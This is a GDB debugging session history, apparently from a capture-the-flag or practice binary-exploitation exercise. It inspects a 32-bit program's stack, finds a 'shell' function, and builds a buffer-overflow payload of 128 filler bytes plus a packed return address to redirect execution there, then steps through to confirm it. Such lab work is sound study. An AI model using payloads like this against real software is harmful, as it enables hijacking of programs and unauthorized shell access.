disas main
break *main
run
set disassembly-flavor intel
display/i $eip
ni
break *main+74
continue
x/wx $ebp-0xc
x/4bx $ebp-0xc
p/x $ebp-0x8c
p/x shell
disas shell
p/x &shell
info address shell
shell python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*128 + struct.pack("<I",0x08048516))' > /tmp/payload
delete 2
break *main+77
run < /tmp/payload
p/x $eax
x/i $eax
continue
p/x $eax
x/i $eax
x/wx $ebp-0xc
si
p/x $eip
x/i $eip
x/wx $esp
exit
